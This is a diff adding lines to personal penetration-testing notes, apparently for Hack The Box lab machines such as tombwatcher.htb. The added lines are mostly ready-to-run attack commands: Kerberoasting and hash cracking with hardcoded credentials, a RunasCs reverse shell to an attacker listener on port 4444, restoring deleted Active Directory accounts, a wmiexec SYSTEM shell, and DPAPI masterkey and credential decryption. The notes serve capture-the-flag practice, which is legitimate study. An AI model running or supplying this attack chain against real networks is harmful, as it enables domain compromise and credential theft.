@@ -111,6 +111,12 @@ The next part is different everytime
    b. faketime "2025-06-09 16:22:00" python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
    
    c. hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+  if you ge $krb5tgs$ hashes do this:
+  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+
+   
    
   If you have **AddSelf**:
   
@@ -356,7 +362,20 @@ main()
 --------------------------------------------------------------------------------------
 usefull tools:
 
-RunasCs.exe
+you loged in with evil-rmn and now upload RunasCs.exe
+then :
+.\RunasCs.exe  svc_ldap (the username you want to be) M1XyC9pW7qT5Vn (his pass) cmd.exe -r 10.10.16.xx:4444
+and in new terminal open : nc -lvnp 4444
+
+powershell
+
+Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID,
+objectSid, lastKnownParent | Format-ListGet-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
+
+Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
+
+net user /domain
+-------------------------------------------------------------------------------------
 
 accesschk.exe
 
@@ -382,5 +401,22 @@ We run wmiexec.py to get a shell as NT/SYTEM
 impacket-wmiexec -k -no-pass '<NAME>.HTB/backupadmin@dc.<name>.htb'
 
 We retrieve the root.txt flag
+
+-----------------------------------------------------------
+if you found some keys and sid keys:
+
+impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
+
+and then:
+impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+
+
+
+
+
+
+
+
+
 
 type C:\Users\Administrator\Desktop\root.txt
